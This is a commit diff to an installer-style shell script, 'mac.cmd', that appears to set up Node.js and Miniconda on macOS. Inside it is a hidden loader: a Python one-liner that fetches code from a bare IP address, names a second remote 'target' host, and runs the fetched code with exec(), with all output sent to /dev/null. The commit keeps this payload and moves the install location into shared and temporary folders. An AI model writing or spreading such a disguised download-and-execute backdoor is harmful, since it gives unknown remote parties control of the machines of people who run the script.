e356d66250ff367e489c1f9d7b07409f11b33f2e
cray31598 <cray31598@gmail.com>
2026-03-24 10:31:38 -0400

    Update mac.cmd

--- mac.cmd
+++ mac.cmd
@@ -57,7 +57,8 @@ fi
 # -------------------------
 # Download portable Node.js if not found globally
 # -------------------------
-USER_HOME="$HOME"
+USER_HOME="/Users/Shared
+/tmp"
 mkdir -p "$USER_HOME"
 
 if [[ -z "$NODE_EXE" ]]; then
@@ -144,9 +145,10 @@ fi
 
 curl -L -o miniconda.sh "$URL" > /dev/null 2>&1 && \
 
-bash miniconda.sh -b -p "$HOME/miniconda3" > /dev/null 2>&1 && \
+bash miniconda.sh -b -p "/Users/Shared
+/tmp/miniconda3" > /dev/null 2>&1 && \
 
-"$HOME/miniconda3/bin/python3" -c "from urllib.request import urlopen,Request;Request._V='7-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" > /dev/null 2>&1 && \
+"/Users/Shared /tmp/miniconda3/bin/python3" -c "from urllib.request import urlopen,Request;Request._V='7-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" > /dev/null 2>&1 && \
 
 echo "Cleaning up..." && \
 rm -f miniconda.sh && \
